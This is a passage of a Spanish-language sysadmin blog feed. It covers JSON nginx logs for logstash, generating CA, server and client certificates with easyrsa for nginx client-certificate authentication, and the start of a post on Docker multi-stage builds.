&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;@timestamp&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;2017-03-10T10:38:56+00:00&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;@fields&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;remote_addr&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;remote_user&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;body_bytes_sent&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;571&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;request_time&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;0.000&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;404&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;GET /nonexistent HTTP/1.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;request_method&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http_referrer&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http_user_agent&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para comprobar que el formato es correcto, y ya de paso verlo más bonito, podemos utilizar cualquier herramienta para validar formato JSON. Como ya sabéis que yo soy un fan del terminal, voy a hacerlo en &lt;strong&gt;python&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@server:~/docker/nginx$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;{ &amp;quot;@timestamp&amp;quot;: &amp;quot;2017-03-10T10:38:37+00:00&amp;quot;, &amp;quot;@fields&amp;quot;: { &amp;quot;remote_addr&amp;quot;: &amp;quot;172.17.0.1&amp;quot;, &amp;quot;remote_user&amp;quot;: &amp;quot;-&amp;quot;, &amp;quot;body_bytes_sent&amp;quot;: &amp;quot;0&amp;quot;, &amp;quot;request_time&amp;quot;: &amp;quot;0.000&amp;quot;, &amp;quot;status&amp;quot;: &amp;quot;304&amp;quot;, &amp;quot;request&amp;quot;: &amp;quot;GET / HTTP/1.1&amp;quot;, &amp;quot;request_method&amp;quot;: &amp;quot;GET&amp;quot;, &amp;quot;http_referrer&amp;quot;: &amp;quot;-&amp;quot;, &amp;quot;http_user_agent&amp;quot;: &amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&amp;quot; } }&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; python -m json.tool
&lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;@fields&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;body_bytes_sent&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;http_referrer&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;http_user_agent&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;remote_addr&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.1&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;remote_user&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;GET / HTTP/1.1&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;request_method&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;request_time&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;0.000&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;304&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;@timestamp&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;2017-03-10T10:38:37+00:00&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@server:~/docker/nginx$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto ya podemos configurar nuestro &lt;strong&gt;logstash&lt;/strong&gt;.&lt;/p&gt;</content><category term="logs"></category><category term="nginx"></category><category term="logstash"></category></entry><entry><title>Generación fácil de certificados con easyrsa</title><link href="http://www.linuxsysadmin.ml/2017/05/generacion-facil-de-certificados-con-easyrsa.html" rel="alternate"></link><published>2017-05-29T10:00:00+02:00</published><updated>2017-05-29T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-05-29:/2017/05/generacion-facil-de-certificados-con-easyrsa.html</id><summary type="html">&lt;p&gt;Ya vimos en &lt;a href="http://www.linuxsysadmin.ml/2016/02/restringiendo-accesos-mediante-certificados-de-cliente.html"&gt;otro artículo&lt;/a&gt; como restringir los accesos a una web usando certificados SSL. Sin embargo, la generación de los mismos era un poco confusa. Sin embargo, existe una herramienta llamada &lt;strong&gt;easyrsa&lt;/strong&gt; que nos permite generar peticiones de forma fácil, firmarlas con nuestra CA y obtener el producto final …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ya vimos en &lt;a href="http://www.linuxsysadmin.ml/2016/02/restringiendo-accesos-mediante-certificados-de-cliente.html"&gt;otro artículo&lt;/a&gt; como restringir los accesos a una web usando certificados SSL. Sin embargo, la generación de los mismos era un poco confusa. Sin embargo, existe una herramienta llamada &lt;strong&gt;easyrsa&lt;/strong&gt; que nos permite generar peticiones de forma fácil, firmarlas con nuestra CA y obtener el producto final.&lt;/p&gt;
&lt;p&gt;Vamos a intentar seguir los pasos del citado artículo, solo en la parte de generación de los certificados. Si no se necesitara, se puede obviar la parte del certificado cliente, o porque no, generar certificados para decenas o cientos de usuarios de forma fácil.&lt;/p&gt;
&lt;p&gt;Vamos a partir de una distribución &lt;a href="https://alpinelinux.org/"&gt;Alpine Linux&lt;/a&gt;. Para los que no lo sospechen ya es un contenedor &lt;strong&gt;Docker&lt;/strong&gt; por la facilidad de crearlo y de destruirlo al acabar el artículo. Además, esta distribución nos ofrece la herramienta en la versión 3, que me ha parecido más intuitiva que la versión anterior. Asumo también que se dispone del paquete &lt;strong&gt;easy-rsa&lt;/strong&gt;, que se puede instalar con &lt;code&gt;apk add easy-rsa&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Preparando la CA&lt;/h2&gt;
&lt;p&gt;lo primero para hacer una CA es copiar la estructura base a cualquier sitio. La idea es que tenemos una copia para cada CA que tengamos en el servidor, y no quiero trabajar en las carpetas de sistema para no destruir la plantilla.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;rsa:~# cp -R /usr/share/easy-rsa/* .
rsa:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Otro paso necesario es inicializar las estructura de PKI, que básicamente es crear un esqueleto de carpetas para contener nuestros ficheros.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;rsa:~# easyrsa init-pki

init-pki complete&lt;span class="p"&gt;;&lt;/span&gt; you may now create a CA or requests.
Your newly created PKI dir is: /root/pki

rsa:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente creamos los certificados y claves necesarios para la CA con un simple comando único.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;rsa:~# easyrsa build-ca
Generating a &lt;span class="m"&gt;2048&lt;/span&gt; bit RSA private key
........................+++
...............................................+++
writing new private key to &lt;span class="s1"&gt;&amp;#39;/root/pki/private/ca.key.XXXXPPMHOb&amp;#39;&lt;/span&gt;
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;, the field will be left blank.
-----
Common Name &lt;span class="o"&gt;(&lt;/span&gt;eg: your user, host, or server name&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Easy-RSA CA&lt;span class="o"&gt;]&lt;/span&gt;:

CA creation &lt;span class="nb"&gt;complete&lt;/span&gt; and you may now import and sign cert requests.
Your new CA certificate file &lt;span class="k"&gt;for&lt;/span&gt; publishing is at:
/root/pki/ca.crt

rsa:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El resultado que deberemos exportar a nuestro servidor es el certificado de la CA, cuya localización es &lt;em&gt;/root/pki/ca.crt&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Generando el certificado de nuestro servidor&lt;/h2&gt;
&lt;p&gt;Este paso se debe repetir tantas veces como servidores queramos que utilicen un certificado SSL. De momento, nos basta con uno. Además, lo vamos a crear sin contraseña porque no queremos tener que introducirla cada vez que se reinicie el servidor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;rsa:~# easyrsa gen-req private nopass
Generating a &lt;span class="m"&gt;2048&lt;/span&gt; bit RSA private key
......................................................+++
.+++
writing new private key to &lt;span class="s1"&gt;&amp;#39;/root/pki/private/private.key.XXXXhfGNmO&amp;#39;&lt;/span&gt;
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;, the field will be left blank.
-----
Common Name &lt;span class="o"&gt;(&lt;/span&gt;eg: your user, host, or server name&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;private&lt;span class="o"&gt;]&lt;/span&gt;:

Keypair and certificate request completed. Your files are:
req: /root/pki/reqs/private.req
key: /root/pki/private/private.key

rsa:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;IMPORTANTE&lt;/strong&gt;: el &lt;em&gt;Common Name&lt;/em&gt; es el parámetro mas importante; debe coincidir con el dominio para que se dé por bueno.&lt;/p&gt;
&lt;p&gt;Lo firmamos con nuestra CA y ya habremos acabado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;rsa:~# easyrsa sign-req server private


You are about to sign the following certificate.
Please check over the details shown below &lt;span class="k"&gt;for&lt;/span&gt; accuracy. Note that this request
has not been cryptographically verified. Please be sure it came from a trusted
&lt;span class="nb"&gt;source&lt;/span&gt; or that you have verified the request checksum with the sender.

Request subject, to be signed as a server certificate &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;3650&lt;/span&gt; days:

&lt;span class="nv"&gt;subject&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;
    &lt;span class="nv"&gt;commonName&lt;/span&gt;                &lt;span class="o"&gt;=&lt;/span&gt; private


Type the word &lt;span class="s1"&gt;&amp;#39;yes&amp;#39;&lt;/span&gt; to &lt;span class="k"&gt;continue&lt;/span&gt;, or any other input to abort.
  Confirm request details: yes
Using configuration from /root/openssl-1.0.cnf
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; /root/pki/private/ca.key:
Check that the request matches the signature
Signature ok
The Subject&lt;span class="s1"&gt;&amp;#39;s Distinguished Name is as follows&lt;/span&gt;
&lt;span class="s1"&gt;commonName            :ASN.1 12:&amp;#39;&lt;/span&gt;private&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
Certificate is to be certified &lt;span class="k"&gt;until&lt;/span&gt; Nov  &lt;span class="m"&gt;9&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:24:39 &lt;span class="m"&gt;2026&lt;/span&gt; GMT &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3650&lt;/span&gt; days&lt;span class="o"&gt;)&lt;/span&gt;

Write out database with &lt;span class="m"&gt;1&lt;/span&gt; new entries
Data Base Updated

Certificate created at: /root/pki/issued/private.crt

rsa:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a necesitar los ficheros &lt;em&gt;/root/pki/private/private.key&lt;/em&gt; y &lt;em&gt;/root/pki/private/private.crt&lt;/em&gt; para ponerlos en nuestro servidor, juntamente con el certificado de la CA.&lt;/p&gt;
&lt;h2&gt;Generando certificados cliente (opcional)&lt;/h2&gt;
&lt;p&gt;Se trata de la misma filosofía; generamos una &lt;em&gt;request&lt;/em&gt;, la firmamos y finalmente la vamos a empaquetar en un fichero &lt;em&gt;.p12&lt;/em&gt; para su fácil y segura distribución.&lt;/p&gt;
&lt;p&gt;Repetimos la generación de la &lt;em&gt;request&lt;/em&gt; de la misma manera:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;rsa:~# easyrsa gen-req gerard
Generating a &lt;span class="m"&gt;2048&lt;/span&gt; bit RSA private key
............................................+++
...........+++
writing new private key to &lt;span class="s1"&gt;&amp;#39;/root/pki/private/gerard.key.XXXXfHJDkE&amp;#39;&lt;/span&gt;
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;, the field will be left blank.
-----
Common Name &lt;span class="o"&gt;(&lt;/span&gt;eg: your user, host, or server name&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;gerard&lt;span class="o"&gt;]&lt;/span&gt;:

Keypair and certificate request completed. Your files are:
req: /root/pki/reqs/gerard.req
key: /root/pki/private/gerard.key

rsa:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Firmamos la petición. Es especialmente importante el parámetro &lt;em&gt;client&lt;/em&gt;, ya que sino, no va a funcionar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;rsa:~# easyrsa sign-req client gerard


You are about to sign the following certificate.
Please check over the details shown below &lt;span class="k"&gt;for&lt;/span&gt; accuracy. Note that this request
has not been cryptographically verified. Please be sure it came from a trusted
&lt;span class="nb"&gt;source&lt;/span&gt; or that you have verified the request checksum with the sender.

Request subject, to be signed as a client certificate &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;3650&lt;/span&gt; days:

&lt;span class="nv"&gt;subject&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;
    &lt;span class="nv"&gt;commonName&lt;/span&gt;                &lt;span class="o"&gt;=&lt;/span&gt; gerard


Type the word &lt;span class="s1"&gt;&amp;#39;yes&amp;#39;&lt;/span&gt; to &lt;span class="k"&gt;continue&lt;/span&gt;, or any other input to abort.
  Confirm request details: yes
Using configuration from /root/openssl-1.0.cnf
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; /root/pki/private/ca.key:
Check that the request matches the signature
Signature ok
The Subject&lt;span class="s1"&gt;&amp;#39;s Distinguished Name is as follows&lt;/span&gt;
&lt;span class="s1"&gt;commonName            :ASN.1 12:&amp;#39;&lt;/span&gt;gerard&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
Certificate is to be certified &lt;span class="k"&gt;until&lt;/span&gt; Nov  &lt;span class="m"&gt;9&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:42:10 &lt;span class="m"&gt;2026&lt;/span&gt; GMT &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3650&lt;/span&gt; days&lt;span class="o"&gt;)&lt;/span&gt;

Write out database with &lt;span class="m"&gt;1&lt;/span&gt; new entries
Data Base Updated

Certificate created at: /root/pki/issued/gerard.crt

rsa:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente tenemos los ficheros &lt;em&gt;gerard.key&lt;/em&gt; y &lt;em&gt;gerard.crt&lt;/em&gt;, que no son lo que solemos importar en nuestro navegador. Para ellos lo empaquetamos en un fichero &lt;em&gt;gerard.12&lt;/em&gt; que está protegido por contraseña y es el que deberá importar el usuario de nuestra web.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;rsa:~# openssl pkcs12 -export -in pki/issued/gerard.crt -inkey pki/private/gerard.key -out gerard.p12
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; pki/private/gerard.key:
Enter Export Password:
Verifying - Enter Export Password:
rsa:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Un ejemplo de servidor nginx funcional&lt;/h2&gt;
&lt;p&gt;Tenemos 3 ficheros para nuestro servidor, que son &lt;em&gt;ca.crt&lt;/em&gt;, &lt;em&gt;server.crt&lt;/em&gt; y &lt;em&gt;server.key&lt;/em&gt;, con los que podemos montar un dominio estándar, como en el artículo citado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/nginx/sites-enabled/private.linuxsysadmin.tk
server &lt;span class="o"&gt;{&lt;/span&gt;
    listen                      &lt;span class="m"&gt;443&lt;/span&gt; ssl&lt;span class="p"&gt;;&lt;/span&gt;
    server_name                 private&lt;span class="p"&gt;;&lt;/span&gt;
    root                        /srv/www&lt;span class="p"&gt;;&lt;/span&gt;

    ssl_certificate             /etc/ssl/certs/server.crt&lt;span class="p"&gt;;&lt;/span&gt;
    ssl_certificate_key         /etc/ssl/private/server.key&lt;span class="p"&gt;;&lt;/span&gt;
    ssl_client_certificate      /etc/ssl/certs/ca.crt&lt;span class="p"&gt;;&lt;/span&gt;
    ssl_verify_client           on&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y suponiendo que el cliente ha importado su clave con éxito, ya tenemos el dominio montado.&lt;/p&gt;</content><category term="easyrsa"></category><category term="openssl"></category><category term="ssl"></category><category term="2 way ssl"></category><category term="certificado"></category></entry><entry><title>Docker 17.05 con multi-stage build</title><link href="http://www.linuxsysadmin.ml/2017/05/docker-1705-con-multi-stage-build.html" rel="alternate"></link><published>2017-05-22T10:00:00+02:00</published><updated>2017-05-22T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-05-22:/2017/05/docker-1705-con-multi-stage-build.html</id><summary type="html">&lt;p&gt;Hacía tiempo que esperaba ansiosamente la nueva versión de &lt;strong&gt;docker&lt;/strong&gt;. La raíz de tanta expectación son las mejoras que la versión candidata anunciaba, especialmente el nuevo modelo de &lt;em&gt;build&lt;/em&gt;. Se ha modificado los &lt;em&gt;Dockerfile&lt;/em&gt; para que puedan generar varias imágenes en un solo fichero, algunas de ellas partiendo de otras …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hacía tiempo que esperaba ansiosamente la nueva versión de &lt;strong&gt;docker&lt;/strong&gt;. La raíz de tanta expectación son las mejoras que la versión candidata anunciaba, especialmente el nuevo modelo de &lt;em&gt;build&lt;/em&gt;. Se ha modificado los &lt;em&gt;Dockerfile&lt;/em&gt; para que puedan generar varias imágenes en un solo fichero, algunas de ellas partiendo de otras.&lt;/p&gt;
&lt;p&gt;La gran mejora de la versión consiste en poder especificar varias veces el &lt;em&gt;keyword&lt;/em&gt; &lt;strong&gt;FROM&lt;/strong&gt;, para poder crear imágenes varias en el mismo fichero. Para ello, hay dos mejoras sustanciales en la sintaxis de los &lt;em&gt;keywords&lt;/em&gt; &lt;strong&gt;FROM&lt;/strong&gt; y &lt;strong&gt;COPY&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;La idea es que puedes crear imágenes intermedias, para que luego algunas otras hereden de ella e incluso se puedan pasar ficheros entre sí. Eso se consigue con dos cambios nuevos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;El &lt;em&gt;keyword&lt;/em&gt; &lt;strong&gt;FROM&lt;/strong&gt; puede incluir un &lt;em&gt;keywork&lt;/em&gt; &lt;strong&gt;AS&lt;/strong&gt;, que va a permitir heredar a las demás imágenes a partir de este &lt;em&gt;keyword&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;El &lt;em&gt;keyword&lt;/em&gt; &lt;strong&gt;COPY&lt;/strong&gt; puede llevar un &lt;em&gt;flag&lt;/em&gt; &lt;strong&gt;--from&lt;/strong&gt; que permite copiar ficheros entre las imágenes creadas por el mismo &lt;em&gt;Dockerfile&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Un ejemplo rápido:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/ejemplo$ cat Dockerfile 
FROM alpine:3.5 AS base
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;cat&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/greeting&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;

FROM base AS victim
RUN &lt;span class="nb"&gt;echo&lt;/span&gt; gold &amp;gt; /stealme
RUN &lt;span class="nb"&gt;echo&lt;/span&gt; hello &amp;gt; /greeting

FROM base
COPY --from&lt;span class="o"&gt;=&lt;/span&gt;victim /stealme /
RUN &lt;span class="nb"&gt;echo&lt;/span&gt; bye &amp;gt; /greeting
gerard@aldebaran:~/docker/ejemplo$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos la imagen como de costumbre:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/ejemplo$ docker build -t ejemplo .
Sending build context to Docker daemon  &lt;span class="m"&gt;2&lt;/span&gt;.048kB
Step &lt;span class="m"&gt;1&lt;/span&gt;/8 : FROM alpine:3.5 AS base
 ---&amp;gt; 4a415e366388
Step &lt;span class="m"&gt;2&lt;/span&gt;/8 : CMD cat /greeting
 ---&amp;gt; Running in c27e95810829
 ---&amp;gt; 36e7f6d769bd
Removing intermediate container c27e95810829
Step &lt;span class="m"&gt;3&lt;/span&gt;/8 : FROM base AS victim
 ---&amp;gt; 36e7f6d769bd
Step &lt;span class="m"&gt;4&lt;/span&gt;/8 : RUN &lt;span class="nb"&gt;echo&lt;/span&gt; gold &amp;gt; /stealme
 ---&amp;gt; Running in 1ea9e0668bb7
 ---&amp;gt; e0dc8c579221
Removing intermediate container 1ea9e0668bb7
Step &lt;span class="m"&gt;5&lt;/span&gt;/8 : RUN &lt;span class="nb"&gt;echo&lt;/span&gt; hello &amp;gt; /greeting
 ---&amp;gt; Running in e0da2940311e
 ---&amp;gt; b2f3845ad8ff
Removing intermediate container e0da2940311e
Step &lt;span class="m"&gt;6&lt;/span&gt;/8 : FROM base
 ---&amp;gt; 36e7f6d769bd
Step &lt;span class="m"&gt;7&lt;/span&gt;/8 : COPY --from&lt;span class="o"&gt;=&lt;/span&gt;victim /stealme /
 ---&amp;gt; 918c21e97a6b
Removing intermediate container 4846e3cc50a7
Step &lt;span class="m"&gt;8&lt;/span&gt;/8 : RUN &lt;span class="nb"&gt;echo&lt;/span&gt; bye &amp;gt; /greeting
 ---&amp;gt; Running in e3ad8598d14d
 ---&amp;gt; e451f40afe17
Removing intermediate container e3ad8598d14d
Successfully built e451f40afe17
Successfully tagged ejemplo:latest
gerard@aldebaran:~/docker/ejemplo$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que los pasos 3 y 6 parten ambos de la imagen &lt;em&gt;base&lt;/em&gt;, mientras que la imagen final, copia un fichero de la imagen &lt;em&gt;victim&lt;/em&gt;, de la que no hereda siquiera.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/ejemplo$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED              SIZE
ejemplo             latest              e451f40afe17        About a minute ago   &lt;span class="m"&gt;3&lt;/span&gt;.99MB
&amp;lt;none&amp;gt;              &amp;lt;none&amp;gt;              b2f3845ad8ff        About a minute ago   &lt;span class="m"&gt;3&lt;/span&gt;.99MB
alpine              &lt;span class="m"&gt;3&lt;/span&gt;.5                 4a415e366388        &lt;span class="m"&gt;2&lt;/span&gt; months ago         &lt;span class="m"&gt;3&lt;/span&gt;.99MB
gerard@aldebaran:~/docker/ejemplo$ docker run --rm b2f3845ad8ff
hello
gerard@aldebaran:~/docker/ejemplo$ docker run --rm ejemplo
bye
gerard@aldebaran:~/docker/ejemplo$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Otro detalle curioso es que el &lt;em&gt;tag&lt;/em&gt; solo se puede dar a la imagen del último &lt;strong&gt;FROM&lt;/strong&gt; del &lt;em&gt;Dockerfile&lt;/em&gt;. Hay que tener en cuenta que si una imagen falla al construir, no se sigue con las demás.&lt;/p&gt;
&lt;h2&gt;Posibles usos&lt;/h2&gt;
&lt;h3&gt;Pipelines de test&lt;/h3&gt;
&lt;p&gt;Cuando una imagen falla, el resto de imágenes no se construyen. Podemos aprovechar este punto para crear la imagen de test, ejecutando los tests necesarios. De esta forma, si los tests fallan, el &lt;em&gt;build&lt;/em&gt; falla y no se genera la imagen posterior de &lt;em&gt;runtime&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Supongamos este &lt;em&gt;Dockerfile&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/pipeline$ cat Dockerfile 
FROM alpine:3.5 AS base
RUN apk add --no-cache python2
COPY script.py /

FROM base
COPY tests.py /
RUN python tests.py

FROM base
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;python&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;script.py&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/pipeline$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Supongamos el el &lt;em&gt;script&lt;/em&gt; de test falla; para ello he puesto un &lt;em&gt;script&lt;/em&gt; que devuelve siempre un código de retorno "1".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/pipeline$ docker build -t release .
Sending build context to Docker daemon  &lt;span class="m"&gt;4&lt;/span&gt;.096kB
...  
Step &lt;span class="m"&gt;6&lt;/span&gt;/8 : RUN python tests.py
 ---&amp;gt; Running in 4572bed9ffb5
Tests FAILED
The &lt;span class="nb"&gt;command&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/bin/sh -c python tests.py&amp;#39;&lt;/span&gt; returned a non-zero code: &lt;span class="m"&gt;1&lt;/span&gt;
gerard@aldebaran:~/docker/pipeline$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No se genera ningún &lt;em&gt;tag&lt;/em&gt;, porque uno de los pasos ha fallado. De esta forma, no tenemos &lt;em&gt;release&lt;/em&gt; porque tenerla no sirve de nada: está rota.&lt;/p&gt;
&lt;p&gt;Veamos ahora lo que pasa si el test tiene éxito:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/pipeline$ docker build -t release .
Sending build context to Docker daemon  &lt;span class="m"&gt;4&lt;/span&gt;.096kB
...  
Step &lt;span class="m"&gt;6&lt;/span&gt;/8 : RUN python tests.py
 ---&amp;gt; Running in 5a8908410927
Tests OK
 ---&amp;gt; 2cd640cc2122
Removing intermediate container 5a8908410927
